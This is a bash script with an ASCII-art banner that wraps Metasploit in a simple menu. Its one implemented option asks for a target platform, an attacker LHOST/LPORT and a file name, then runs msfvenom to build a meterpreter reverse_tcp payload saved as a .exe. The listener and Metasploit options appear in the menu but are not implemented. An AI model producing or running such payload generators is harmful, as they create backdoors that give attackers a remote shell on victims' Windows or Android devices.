#!/bin/bash

lgreen="\e[92m"
lred="\e[91m"
nc="\e[39m"

clear

while :
do

echo -e $lred""
cat << "EOF"

                    .MMh:                                                    `/dN.                  
                     oMMMNs-                                              `/yMMM/                   
                     `mMMMMMd+.                                        `:yNMMMMh                    
                      :MMMMMMMNy/`                                   :sNMMMMMMN.                    
                       yMMMMMMMMMms-                              -omMMMMMMMMM/                     
                       .NMMMMMMMMMMMd+.       ``.....`         .+dMMMMMMMMMMMy                      
                        +MMMMMsyNMMMMds::+shdNNNNNNNNNNmdy+`.+hNMMMMMMhNMMMMm`                      
                        `dMMMMd`.+yooymNMMMMMMMMMMMMMMMMdoohNMMMMMMd+.+MMMMM/                       
                         -MMMMM+`+dNMMMMMMMMmdhhyyyyyhsoyNMMMMMMdso/`.NMMMMs                        
                          sMMMMN-mMMMMMmyssoyhdh/` `:smMMMMMMmsoymMMmo+dMMm`                        
                          `mMMMMy/MMdo.``/hMMMMMMms/sNMMMMmy:`-sNMMMMMmo+m:                         
                          ./MMMMM/o-`     `-smMMMMMNdoohy/`     .+dMMMMMm/                          
                         :m:hMMMMm`        .+sohNMMMMMNh/`        .+dMMMMNs`                        
                        +NMm-NMMMMo     `/yNMMNhosdMMMMMMmo-`     omosMMMMMh.                       
                       /MMMMooMMMMN- `:ymMMMMMMdo``:smMMMMMNd+.  -NMMy+NMMMMh`                      
                      -NMMMMs`mMMmy/smMMMMMMms:`     ./hNMMMMMNy`dMMMMs:NMMMMy                      
                     `dMMMMd` :yosdNMMMMMmy:.          `.odMMMMooMMMMN- /MMMMM:                     
                     :MMMMM: .+dNMMMMMNy/.`               `:smd:NMMMMo. `hMMMMd                     
                     yMMMMd-hNMMMMMNho.`                     .-dMMMMd:my:/mMMMM.                    
                     mMMMMsoMMMMNdsohm:                       sMMMMN:mMMMdsoyNM/                    
                     NMMMM+yMMdo-omMMMd`                     :MMMMMo:mMMMMMNhss:                    
                 `:s.mMMMMo+s:`  -MMMMM+                    `mMMMMd` ./hNMMMMMmy:`                  
              `-odNM/hMMMMh`      sMMMMN.                   sMMMMN-    `-odMMMMMMdo-`               
           `-+hNMMMMy/MMMMM-      `mMMMMy                  :MMMMM+       ssoymMMMMMNh/.             
         ./hNMMMMMNh/`mMMMMh`      /MMMMM:                `mMMMMh`      :MMNds/hNMMMMMmy:`          
      ./ymMMMMMMMh+:--+sssss:------.hMMMMm`.............../hhhhh-````` -NMMMMh``-smMMMMMMdo-`       
   `:ymMMMMMMMMMMMMMMMMMMMNNNNNNNNNd-NMMMMo+Nmmmmmmmmmmmmmmmddmddddddo-mMMMMm:hhhhdMMMMMMMMNh/.     
`-sdMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMooMMMMN-mMMMMMMMMMMMMMMMMMMMMMMNooNMMMMd:mMMMMMMMMMMMMMMMMmy:`  
.////+/++++++++oooooooosossyyyyhyyyys`mMMMMh:hhhhhhhhhhdddddmdddddy+hMMMMMy:hmmmmmmmmmmmmmmmNNNNmh+`
                          `smmmmmdo.` :MMMMM/          /hhhhh.  `:hNMMMMN+```````.``............-...
                           `/dMMMMMNy/.ymNMMm`        .NMMMMy.-odMMMMMNy.                           
                             `/dNMMMMMNhysoyh+        hMMMMm-dMMMMMMms-                             
                               `-smNMMMMMMMmdhysoooo-+MMMMM/hMMMMNh+.                               
                                  `:ohNNMMMMMMMMMMMm-NMMMMy+MNmy/.                                  
                                      .-/shmmNNNNNN:hMMMMm`//-                                      
                                          /hyyss/:-+MMMMM:                                          
                                          `mMMMMy`.NMMMMs                                           
                                           /MMMMM:dMMMMm`                                           
                                            hMMMMNMMMMM:                                            
                                            .NMMMMMMMMs                                             
                                             oMMMMMMMd`                                             
                                             `mMMMMMM-                                              
                                              :MMMMMo                                               
                                               yMMMd`                                               
                                               .NMM-                                                
                                                +M+                                                 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
....................................................................................................
EOF

echo -e $lgreen""
echo "1) Make a Payload"
echo ""
echo "2) Start a Listener"
echo ""
echo "3) Start Metsaploit"
echo ""
echo "E) Exit"
read -p "-->> " player1
##################################################################################################################################
if [[ $player1 == "1" ]]; then
clear
echo "Make a Payload:"
echo "More coming soon..."
echo "Meterpreter / reverse_tcp"
echo ""
echo ""
echo "What type of payload do you want"
echo ""
echo "windows) Windows"
echo ""
echo "android) Android"
echo ""
read -p "-->> " payloadtype
echo ""
read -p "LHOST -->>" LHOST
echo ""
read -p "LPORT -->>" LPORT
echo ""
read -p "Payload Name -->>" PNAME
EXE=.exe
PNAMEEXE="$PNAME$EXE"
echo ""
echo "creating now.."
msfvenom -p $payloadtype/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o /root/$PNAMEEXE
echo "saved to /root/$PNAMEEXE"
sleep 5

fi
##################################################################################################################################
done